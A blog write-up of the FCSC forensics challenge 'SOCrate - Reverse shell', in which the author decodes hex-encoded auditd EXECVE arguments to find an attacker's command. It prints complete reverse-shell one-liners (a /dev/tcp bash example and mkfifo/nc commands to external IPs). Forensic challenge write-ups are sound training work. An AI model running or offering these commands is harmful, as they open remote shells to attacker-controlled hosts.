<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>FCSC : SOCrate - Reverse shell | Sanlokii</title>
<meta name=keywords content="Forensics,Write-up"><meta name=description content="Forensics - Medium"><meta name=author content><link rel=canonical href=https://sanlokii.eu/writeups/fcsc/socrate-reverse-shell/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://sanlokii.eu/assets/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.eu/assets/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.eu/assets/imagesfavicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.eu/assets/images/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.eu/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sanlokii.eu/writeups/fcsc/socrate-reverse-shell/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://sanlokii.eu/writeups/fcsc/socrate-reverse-shell/"><meta property="og:site_name" content="Sanlokii"><meta property="og:title" content="FCSC : SOCrate - Reverse shell"><meta property="og:description" content="Forensics - Medium"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-04-27T00:00:00+00:00"><meta property="article:modified_time" content="2025-04-27T00:00:00+00:00"><meta property="article:tag" content="Forensics"><meta property="article:tag" content="Write-Up"><meta property="og:image" content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta name=twitter:title content="FCSC : SOCrate - Reverse shell"><meta name=twitter:description content="Forensics - Medium"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.eu/writeups/"},{"@type":"ListItem","position":2,"name":"FCSC : SOCrate - Reverse shell","item":"https://sanlokii.eu/writeups/fcsc/socrate-reverse-shell/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"FCSC : SOCrate - Reverse shell","name":"FCSC : SOCrate - Reverse shell","description":"Forensics - Medium","keywords":["Forensics","Write-up"],"articleBody":"Statement: In June 2023, an operator of vital importance falls victim to an attack that compromises its entire information system. You have received the Linux and Windows logs and must answer the investigators’ questions.\nNote: The parts are numbered in the chronological order of the attack, but it is not necessary to solve them in order.\nThe attacker has executed a reverse shell on a machine. Find the command corresponding to the execution of this reverse shell.\nFlag format: FCSC{COMMAND_LINE}\nExample: FCSC{bash -i \u003e\u0026 /dev/tcp/10.42.43.44/1234 0\u003e\u00261}\nI start by inspecting the linux logs and notice that they are auditd logs :\n... node=webserver type=SYSCALL msg=audit(1686754794.649:12018): arch=c000003e syscall=59 success=yes exit=0 a0=7fe4a00d84e0 a1=7fe4a005d230 a2=7fff070c9698 a3=7fe4c3518ac0 items=2 ppid=5871 pid=11778 auid=4294967295 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=4294967295 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"program_execution\" ARCH=x86_64 SYSCALL=execve AUID=\"unset\" UID=\"ubuntu\" GID=\"ubuntu\" EUID=\"ubuntu\" SUID=\"ubuntu\" FSUID=\"ubuntu\" EGID=\"ubuntu\" SGID=\"ubuntu\" FSGID=\"ubuntu\" node=webserver type=EXECVE msg=audit(1686754794.649:12018): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=726D202F746D702F663B6D6B6669666F202F746D702F663B636174202F746D702F667C2F62696E2F7368202D6920323E26317C6E632038302E3132352E392E3538203530303131203E2F746D702F66 node=webserver type=CWD msg=audit(1686754794.649:12018): cwd=\"/var/www/app/banque_paouf\" ... The auditd logs are composed of the following elements, which will be of interest to me in finding the payload :\nSYSCALL : system call triggered EXECVE : arguments passed to a command PROCTITLE : command line often encoded in hexadecimal Rather than using the ausearch binary to parse auditd logs, I prefer to play with bash.\n# cat linux/*.log | grep -i \"execve\" | grep \"bash\" | grep \"argc\" ... node=webserver type=EXECVE msg=audit(1686907217.007:18745): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=7375646F202E2F7465787420636C69656E74202D762038302E3132352E392E35373A353030313220523A736F636B73 node=bastion type=EXECVE msg=audit(1686916694.736:7725): argc=1 a0=\"-bash\" node=ip-172-16-45-110 type=EXECVE msg=audit(1686916709.895:1891226): argc=1 a0=\"-bash\" node=ip-172-16-45-110 type=EXECVE msg=audit(1686916718.195:1891415): argc=3 a0=\"bash\" a1=\"-c\" a2=736370202D74202E ... I see in my output that most of the a2 arguments correspond to a bash command encoded in hexadecimal.\nSo I’m working on the following oneliner to get all the arguments encoded and return the result in plain text :\n# cat linux/*.log | grep -i \"execve\" | grep \"/bin/bash\" | grep \"argc\" | awk '{print $7}' | sed $'s/a2=/0a/g' | xxd -r -p | uniq ... rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 80.125.9.58 50011 \u003e/tmp/f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 80.125.9.57 50012 \u003e/tmp/f ... Flag : FCSC{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 80.125.9.58 50011 \u003e/tmp/f}\n","wordCount":"347","inLanguage":"en","image":"https://sanlokii.eu/assets/images/yggdrasil_circle.png","datePublished":"2025-04-27T00:00:00Z","dateModified":"2025-04-27T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.eu/writeups/fcsc/socrate-reverse-shell/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.eu/assets/images/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.eu/ accesskey=h title="Sanlokii (Alt + H)"><img src=https://sanlokii.eu/assets/images/apple-touch-icon.png alt aria-label=logo height=40>Sanlokii</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sanlokii.eu/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://sanlokii.eu/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://sanlokii.eu/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.eu/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.eu/writeups/>Writeups</a></div><h1 class="post-title entry-hint-parent">FCSC : SOCrate - Reverse shell</h1><div class=post-description>Forensics - Medium</div><div class=post-meta><span title='2025-04-27 00:00:00 +0000 UTC'>April 27, 2025</span>&nbsp;·&nbsp;2 min</div></header><div class=post-content><p><strong>Statement:</strong>
In June 2023, an operator of vital importance falls victim to an attack that compromises its entire information system. You have received the Linux and Windows logs and must answer the investigators&rsquo; questions.</p><p>Note: The parts are numbered in the chronological order of the attack, but it is not necessary to solve them in order.</p><p>The attacker has executed a reverse shell on a machine. Find the command corresponding to the execution of this reverse shell.</p><p>Flag format: FCSC{COMMAND_LINE}</p><p>Example: FCSC{bash -i >& /dev/tcp/10.42.43.44/1234 0>&amp;1}</p><hr><p>I start by inspecting the linux logs and notice that they are auditd logs :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>...
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>webserver type<span style=color:#f92672>=</span>SYSCALL msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686754794.649:12018<span style=color:#f92672>)</span>: arch<span style=color:#f92672>=</span>c000003e syscall<span style=color:#f92672>=</span><span style=color:#ae81ff>59</span> success<span style=color:#f92672>=</span>yes exit<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> a0<span style=color:#f92672>=</span>7fe4a00d84e0 a1<span style=color:#f92672>=</span>7fe4a005d230 a2<span style=color:#f92672>=</span>7fff070c9698 a3<span style=color:#f92672>=</span>7fe4c3518ac0 items<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> ppid<span style=color:#f92672>=</span><span style=color:#ae81ff>5871</span> pid<span style=color:#f92672>=</span><span style=color:#ae81ff>11778</span> auid<span style=color:#f92672>=</span><span style=color:#ae81ff>4294967295</span> uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> euid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> suid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> fsuid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> egid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> sgid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> fsgid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> tty<span style=color:#f92672>=(</span>none<span style=color:#f92672>)</span> ses<span style=color:#f92672>=</span><span style=color:#ae81ff>4294967295</span> comm<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bash&#34;</span> exe<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/usr/bin/bash&#34;</span> subj<span style=color:#f92672>=</span>unconfined key<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;program_execution&#34;</span> ARCH<span style=color:#f92672>=</span>x86_64 SYSCALL<span style=color:#f92672>=</span>execve AUID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;unset&#34;</span> UID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> GID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> EUID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> SUID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> FSUID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> EGID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> SGID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span> FSGID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ubuntu&#34;</span>
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>webserver type<span style=color:#f92672>=</span>EXECVE msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686754794.649:12018<span style=color:#f92672>)</span>: argc<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> a0<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span> a1<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-c&#34;</span> a2<span style=color:#f92672>=</span>726D202F746D702F663B6D6B6669666F202F746D702F663B636174202F746D702F667C2F62696E2F7368202D6920323E26317C6E632038302E3132352E392E3538203530303131203E2F746D702F66
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>webserver type<span style=color:#f92672>=</span>CWD msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686754794.649:12018<span style=color:#f92672>)</span>: cwd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/www/app/banque_paouf&#34;</span>
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>The auditd logs are composed of the following elements, which will be of interest to me in finding the payload :</p><ul><li><strong>SYSCALL</strong> : system call triggered</li><li><strong>EXECVE</strong> : arguments passed to a command</li><li><strong>PROCTITLE</strong> : command line often encoded in hexadecimal</li></ul><p>Rather than using the ausearch binary to parse auditd logs, I prefer to play with bash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cat linux/*.log | grep -i &#34;execve&#34; | grep &#34;bash&#34; | grep &#34;argc&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>webserver type<span style=color:#f92672>=</span>EXECVE msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686907217.007:18745<span style=color:#f92672>)</span>: argc<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> a0<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span> a1<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-c&#34;</span> a2<span style=color:#f92672>=</span>7375646F202E2F7465787420636C69656E74202D762038302E3132352E392E35373A353030313220523A736F636B73
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>bastion type<span style=color:#f92672>=</span>EXECVE msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686916694.736:7725<span style=color:#f92672>)</span>: argc<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> a0<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-bash&#34;</span>
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>ip-172-16-45-110 type<span style=color:#f92672>=</span>EXECVE msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686916709.895:1891226<span style=color:#f92672>)</span>: argc<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> a0<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-bash&#34;</span>
</span></span><span style=display:flex><span>node<span style=color:#f92672>=</span>ip-172-16-45-110 type<span style=color:#f92672>=</span>EXECVE msg<span style=color:#f92672>=</span>audit<span style=color:#f92672>(</span>1686916718.195:1891415<span style=color:#f92672>)</span>: argc<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> a0<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bash&#34;</span> a1<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-c&#34;</span> a2<span style=color:#f92672>=</span>736370202D74202E
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>I see in my output that most of the a2 arguments correspond to a bash command encoded in hexadecimal.</p><p>So I&rsquo;m working on the following oneliner to get all the arguments encoded and return the result in plain text :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cat linux/*.log | grep -i &#34;execve&#34; | grep &#34;/bin/bash&#34; | grep &#34;argc&#34; | awk &#39;{print $7}&#39; | sed $&#39;s/a2=/0a/g&#39; | xxd -r -p | uniq</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 80.125.9.58 <span style=color:#ae81ff>50011</span> &gt;/tmp/f
</span></span><span style=display:flex><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 80.125.9.57 <span style=color:#ae81ff>50012</span> &gt;/tmp/f
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>Flag : <code>FCSC{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 80.125.9.58 50011 >/tmp/f}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sanlokii.eu/tags/forensics/>Forensics</a></li><li><a href=https://sanlokii.eu/tags/write-up/>Write-Up</a></li></ul><nav class=paginav><a class=prev href=https://sanlokii.eu/writeups/fcsc/socrate-outil-telecharge/><span class=title>« Prev</span><br><span>FCSC : SOCrate - Outil téléchargé</span>
</a><a class=next href=https://sanlokii.eu/writeups/downunderctf/bad-policies/><span class=title>Next »</span><br><span>DownUnderCTF : Bad Policies</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share FCSC : SOCrate - Reverse shell on x" href="https://x.com/intent/tweet/?text=FCSC%20%3a%20SOCrate%20-%20Reverse%20shell&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2ffcsc%2fsocrate-reverse-shell%2f&amp;hashtags=Forensics%2cWrite-up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share FCSC : SOCrate - Reverse shell on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2ffcsc%2fsocrate-reverse-shell%2f&amp;title=FCSC%20%3a%20SOCrate%20-%20Reverse%20shell&amp;summary=FCSC%20%3a%20SOCrate%20-%20Reverse%20shell&amp;source=https%3a%2f%2fsanlokii.eu%2fwriteups%2ffcsc%2fsocrate-reverse-shell%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://sanlokii.eu/>Sanlokii</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>